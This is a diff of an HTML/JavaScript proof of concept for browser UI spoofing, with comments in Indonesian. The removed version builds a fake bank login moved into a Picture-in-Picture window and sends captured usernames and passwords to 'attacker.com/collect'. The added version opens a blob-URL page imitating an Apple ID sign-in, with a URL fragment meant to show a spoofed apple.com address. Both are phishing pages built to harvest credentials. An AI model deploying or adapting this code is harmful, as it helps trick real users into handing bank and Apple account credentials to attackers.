@@ -1,93 +1,24 @@
-<title>Banking App</title>
-<style>#authKit { display: none; }</style>
+<script>
+// Simple version - seperti original Renwa
+payload = 'x#https://www.account.apple.com';
 
-<center>
-<br><br><br><h2>Secure <b>Bank Login</b>: <br><br><br><br>
-<img style="cursor: pointer; width: 300px;" src=https://www.pngitem.com/pimgs/m/140-1400376_login-button-png-transparent-png.png id="loginBtn">
-
-<div id="authKit">
-<title>Secure Bank Portal</title>
-<iframe id=bankFrame style="position: fixed;display:none;top: 0;left: 0;width: 100%;height: 100%;border: none;z-index: 999999;" srcdoc='
-<!DOCTYPE html>
+// Create blob dengan fake login page
+fakePage = `
 <html>
-<head><title>Bank Login</title></head>
-<body style="background: #1a237e; color: white; font-family: Arial; margin: 0; padding: 40px;">
-    <center>
-    <h1>🏦 Secure Bank</h1>
-    <h3>Online Banking Login</h3>
-    
-    <form id=loginForm onsubmit="return processLogin(this)">
-        <input type="text" name="username" placeholder="Username" required style="padding: 12px; margin: 8px; width: 300px; border-radius: 4px; border: 1px solid #ccc;"><br>
-        <input type="password" name="password" placeholder="Password" required style="padding: 12px; margin: 8px; width: 300px; border-radius: 4px; border: 1px solid #ccc;"><br>
-        <button type="submit" style="padding: 12px 30px; background: #00C851; color: white; border: none; border-radius: 4px; cursor: pointer; margin-top: 15px;">
-            Secure Login
-        </button>
+<body style="font-family: Arial; padding: 40px; text-align: center;">
+    <h1>🍎 Apple ID</h1>
+    <form onsubmit="alert('Login attempted')">
+        <input type="email" placeholder="Apple ID"><br><br>
+        <input type="password" placeholder="Password"><br><br>
+        <button>Sign In</button>
     </form>
-    </center>
-
-    <script>
-        function processLogin(form) {
-            const credentials = {
-                username: form.username.value,
-                password: form.password.value,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Kirim ke parent context (PiP window)
-            if (window.parent && window.parent.handleStolenCredentials) {
-                window.parent.handleStolenCredentials(credentials);
-            }
-            
-            // Tampilkan fake success
-            document.body.innerHTML = `
-                <center style="padding: 100px;">
-                    <h2 style="color: #00C851;">✅ Login Successful</h2>
-                    <p>Accessing your account...</p>
-                </center>
-            `;
-            
-            return false;
-        }
-    </script>
 </body>
 </html>
-'></iframe>
+`;
 
-<script>
-// Function yang ikut tertransplant ke PiP
-function handleStolenCredentials(creds) {
-    console.log('CREDENTIALS CAPTURED IN PiP:', creds);
-    
-    // Dalam real attack, kirim ke server attacker
-    fetch('https://attacker.com/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(creds)
-    }).catch(err => console.log('Send failed:', err));
-    
-    // Tampilkan feedback di PiP
-    alert('Login verified! Redirecting...');
-}
-</script>
-</div>
+blob = new Blob([fakePage], { type: 'text/html' });
+url = URL.createObjectURL(blob);
 
-<script> 
-    var launchBankSpoof = async () => {
-        const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 500,
-            height: 600
-        });
-
-        // 🎯 TRANSPLANT: Pindahkan entire auth kit
-        pipWindow.document.body.append(authKit);
-        
-        // 🎯 ACCESS & ACTIVATE: iframe sekarang available di PiP context
-        pipWindow.bankFrame.style.display = 'block';
-        
-        // 🎯 FUNCTION PRESERVATION: handleStolenCredentials tersedia
-        console.log('PiP ready - functions preserved:', 
-                   typeof pipWindow.handleStolenCredentials);
-        
-    };
-    loginBtn.onclick = launchBankSpoof;
+// Redirect ke blob URL dengan payload
+location = url + '#?' + payload;
 </script>
